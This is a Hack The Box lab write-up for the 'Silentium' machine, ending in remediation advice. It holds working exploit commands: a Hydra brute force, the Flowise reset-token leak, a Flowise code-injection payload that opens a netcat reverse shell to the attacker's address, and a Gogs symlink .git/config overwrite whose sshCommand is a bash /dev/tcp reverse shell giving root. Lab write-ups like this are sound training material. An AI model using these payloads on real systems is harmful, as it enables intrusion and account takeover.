---
title: Silentium
date: 2026-04-13
category: [HackTheBox, Linux]
tags: [nmap,]
difficulty: Easy
platform: HackTheBox
os: Linux
summary: Silentium is an easy rated machine on Hack The Box
machine_url: https://app.hackthebox.com/machines/Silentium
achievement: https://labs.hackthebox.com/achievement/machine/1737280/867
pinned: true
tldr: |
    - **Initial Access:** Fuzzing revealed a staging subdomain running Flowise with verbose error handling that leaked valid user emails, leading to account compromise via a password reset token flaw (CVE-2025-58434).
    - **Execution & Foothold:** Leveraged a custom MCP server loading vulnerability (CVE-2025-59528) within Flowise to achieve Remote Code Execution and obtain a reverse shell from inside the Docker container.
    - **Lateral Movement:** Extracted plain-text credentials from environment variables inside the container and reused the password via SSH to compromise the `ben` user account.
    - **Privilege Escalation:** Configured an SSH tunnel to access an internal loopback-bound Gogs service and exploited an authenticated path traversal and symbolic link vulnerability (CVE-2025-8110) to overwrite git configurations and achieve full `root` compromise.
---

## Reconnaissance
Start with a Nmap scan:
```bash
sudo nmap -sVC -sS -vv -p- <IP> --min-rate 5000 -oN nmap-scan
```
![](/images/silentium/Pasted-image-20260412090628.png)
Type the `IP:80` into the browser, it resolves to `silentium.htb`. Add this IP domain pair to `/etc/hosts`, we were able to land on the web page.
![](/images/silentium/Pasted-image-20260412090910.png)
Since the webpage not showing any possible routes to continue forward, I try directory enumeration and subdomain and vhost enumeration.
However, it seems like every directory is returned 200 status code, which gives a hard time to bruteforcing directory. So I just move on with subdomain and vhost enumeration:
```bash
ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" -mc 200
```
![](/images/silentium/Pasted-image-20260412095002.png)
There is a staging returning status code 200, so we should give it a check. First add it into `/etc/hosts`.
![](/images/silentium/Pasted-image-20260412093300.png)
We landed into a Sign In page. I should try to see if it returns any interesting thing:
![](/images/silentium/Pasted-image-20260412093517.png)
Okay so as indicate here the error returning `User Not Found`. Which is a kinda specific error, it's giving me a courage to tryna bruteforce for an available email. But first we need to know the correct domain of the mail server.
Since I have some names in the Leadership fragment of `silentium.htb`, I tried some of them with the domain `silentium.htb` and got this:
![](/images/silentium/Pasted-image-20260412101234.png)
Okay so from this we now got some clear clue:
- The domain for the mail server is silentium.htb.
- The error return is too verbose and exposing valid emails.
```bash
hydra -v -f -l "ben@silentium.htb" \
-P ../../../Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt \
staging.silentium.htb http-post-form \
"/api/v1/auth/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:1=401:H=Content-Type:application/json:H=Accept:application/json, text/plain, */*:H=Host:staging.silentium.htb:H=x-request-from:internal:Incorrect Email or Password"
```
- `1=401`: Makes hydra treats 401 status code as fail attempt
- The damn Fail string must go in last.
![](/images/silentium/Pasted-image-20260412124605.png)
So hydra reporting that a valid password was found, but it's not showing any?
Okay after some research, it looks like in the `rockyou` wordlist contains some "empty" password. So hydra could be implying that password is valid. 
As I tried for the `ben@silentium.htb:` pair, there was a flash to a directory `/chatflows`, and then I got redirected back to the login page.
So try use Burp Suite to intercept the progress and maybe slow down to see what happened.
![](/images/silentium/Pasted-image-20260412125044.png)
So it is true that we got status code 200 as the response and some kind of dashboard page. And if I turn off the intercept, I got redirected back to login page immediately.
While in intercepting, I can still open page settings and check some options:
![](/images/silentium/Pasted-image-20260412125315.png)
As I tried fetching the Version number to test, burp intercepted a request to `/api/v1/version`:
![](/images/silentium/Pasted-image-20260412125533.png)
Okay so after some research online, I've bumped into a vulnerability that is affecting the current version of Flowise CVE-2025-58434.
## [CVE-2025-58434](https://github.com/advisories/GHSA-wgpv-6j63-x5ph)
- Package: flowise (npm)
- Affected version: <= 3.0.5
- Patched: 3.0.6
- Severity: 9.8/10 (Critical)
- Attack vector: Network
- Weaknesses: CWE-306
So basically this vulnerability occurs in the reset password feature.
The reset password feature allows user to request for **Reset password Instruction**, which then trigger a POST HTTP request to `/api/v1/account/forgot-password` with the given Email address. BUT instead of only sending the reset email, the API also response directly back with sensitive user information, leading to a complete Account Takeover (ATO).
The informaton responsed includes:
- User ID, name, email, hashed credential, status, timestamps.
- **A valid `tempToken` and its expiry**, which is intended for password reset.
## Exploitation
So the requested API then send us literally everything we needed to take over the current account we've found.
```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
-H "Content-Type: application/json" \
-H "Accept: application/json, text/plain, */*" \
-H "Origin: http://staging.silentium.htb" \
-H "Referer: http://staging.silentium.htb/forgot-password" \
-d '{"user":{"email":"ben@silentium.htb"}}'
```
![](/images/silentium/Pasted-image-20260412134401.png)
Okay now we can use that Temp token to reset ben's password and login.
Another CVE found for current Flowise version: CVE-2025-59528
## [CVE-2025-59528](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p)
- Package: flowise (npm)
- Affected version: 3.0.5
- Patched: 3.0.6
- Severity: 10/10 (Critical)
- Attack vector: Network
- Weaknesses: CWE-94
So Flowise has a feature for users to input configuration settings for custom MCP servers. The input is then provided via the api endpoint `api/v1/node-load-method/customMCP` that is triggered when the custom MCP server is loaded. The input is then passed into a Function() constructor, which then evaluates and executes the input in global Node.js context, leading to RCE.
## Exploitation
Open Burp Suite and intercept the load customMCP request:
![](/images/silentium/Pasted-image-20260412210923.png)
First we gonna test if the instance is vulnerable by modifying the data part like so:
```
{"loadMethod":"listActions",
"inputs":{"mcpServerConfig":"(global.process.mainModule.require('child_process').execSync('ping 10.10.14.11'))"}}
```
If the server is vulnerable, then it will start pinging back to my machine.
Open WireShark to capture network traffic.
![](/images/silentium/Pasted-image-20260412211151.png)
As shown above I'm getting ICMP Echo request from the target machine indicating the `ping` command runs successfully.
Now next step we need to craft a reverse shell payload back to my machine.
```
{"loadMethod":"listActions",
"inputs":{"mcpServerConfig":"(global.process.mainModule.require('child_process').execSync('rm -f /tmp/a; mkfifo /tmp/a; nc 10.10.14.11 4444 0</tmp/a | /bin/sh >/tmp/a 2>&1'))"}}
```
Start a netcat listener on port 4444, and we got the shell. The reason why I'm using such roundabout payload is that my default payload which is the `/bin/bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'` somehow doesn't work.
![](/images/silentium/Pasted-image-20260412213635.png)
The .dockerenv indicating that we are in a docker environment. That root returning for `whoami` really made me think that I've clutch this machine.
It is said that we should check for environment variables (`environ` files inside `/proc/<pid>`) where creds are always left. So I tried dump some of those environment files
![](/images/silentium/Pasted-image-20260413091542.png)
Here I see some password left here, just wondering if ben uses the same password for everything.
So let's try ssh into ben account and try those found password:
![](/images/silentium/Pasted-image-20260413091829.png)
And turns out the password was the same as the `SMTP_PASSWORD`(`r04D!!_R4ge`). We got lucky.
And now we were able to retrieve the user's flag.
## Privilege Escalation
![](/images/silentium/Pasted-image-20260413092028.png)
Okay `sudo -l` shows that ben cannot run sudo on this system.
![](/images/silentium/Pasted-image-20260413092145.png)
It seems like ben is the only user here.
Checking for SUID binaries
![](/images/silentium/Pasted-image-20260413092935.png)
Checking Kernel version:
![](/images/silentium/Pasted-image-20260413095301.png)
![](/images/silentium/Pasted-image-20260413164734.png)
Checking local network service, I noticed there are some loopback-bounded listeners. But the current user's privilege is too low that I cannot see what the services are.
So set up a ssh tunnel for port forwarding for each service:
```
ssh -L 44444:IP:3001 ben@IP
```
First, check the service on port 3001 by accessing localhost:44444 on my browser:
![](/images/silentium/Pasted-image-20260413165831.png)
It's running an instance of Gogs. Never heard of that. But if the machine is running Gogs then there must be files that are related some where.
So by a simple `find / -name gogs 2>/dev/null` I was able to locate the gogs directory in `/opt/gogs/gogs`.
Running `./gogs -v` to check the version: 
![](/images/silentium/Pasted-image-20260413172823.png)
So I tried searching online for known CVEs affecting this version, and found CVE-2025-8110.
## [CVE-2025-8110](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit)
- Package: gogs.io/gogs (Go)
- Affected version: <= 0.13.3
- Severity: 8.7/10 (High)
- Weaknesses: CWE-22
So this CVE is a bypass to a previous patched CVE-2024-55947, where Gogs is vulnerable to a path traversal weakness that allows attackers to write files outside of the git repository directory. This CVE is then patched by adding an input validation on the path parameter.
However, the fix didn't account for Symbolic Links, since Git, and both Gogs allow to use Symbolic links in repositories, and those symbolic links can point to objects outside the repo. Attacker can simply make a Symbolic link pointing to .git/config file and modify its content, especially `sshCommand` field, leading to RCE.
## Exploitation
First we need to create an account and a malicious repository.
Go to account settings, craft a Personal Access Token.
Clone the machine (In this case the link is `http://localhost:44444/...` since it's been forwarded).
Create a Symbolic Link pointing to .git/config:
```bash
ln -s ".git/config" malicious_path
```
Commit and push the updates.
Then, perform the same `curl` request as the old CVE, but now replace the path traversal path with our crafted Symlink:
```bash
curl -v --path-as-is -X PUT --url "http://localhost:44444/api/v1/repos/haha/pwn/contents/malicious_path" \
-H "Authorization: token c051cfad07825413ef986b0c210911c93eb66530" \
-H "Content-Type: application/json" \
--data '{
  "message": "pwn",
  "content": "'"$(base64 < ./command | tr -d '\n')"'"
}'
```
The command file stores the content you want to write into the `.git/config` file, in this case I modify the `sshCommand` to craft a reverse shell payload back to my machine:
```
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
    ignorecase = true
    precomposeunicode = true
    sshCommand = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1' #"
[remote "origin"]
    url = git@localhost:gogs/{repo_name}.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
    remote = origin
    merge = refs/heads/master
```
Open a netcat listener on the desired port (4444) and request. We got the shell. And in this case it's a root shell.
![](/images/silentium/Pasted-image-20260413180932.png)
![](/images/silentium/Pasted-image-20260413181023.png)
## Remediation
#### Usage of vulnerable instance of Flowise, and too verbose error message:
- Observation: Difference between the error message of an invalid user email and a valid user email (ben@silentium.htb), allowing the attacker to easily identify the account. The vulnerability in `forgot-password` API turning it into a severe account compromise, and another API vulnerability leads to RCE.
- Remediation: Upgrade the Flowise instance to a more secure version with patched error. Fix the error message upon login failed.
#### Credentials stored plain in environ file & password reuse
- Observation: Some credentials (SMTP_PASSWORD) are stored in plain text inside environ files in docker containers. And the password reuse help attacker gets the initial foothold on the machine.
- Remediation: Use better ways to store credentials if needed to (Docker secrets, ), or restricted it to privileged users.
#### Insecure service 
- Observation: Usage of insecure Gogs instance leads to privilege escalation and machine compromise.
- Remediation: Upgrade to a more secure version.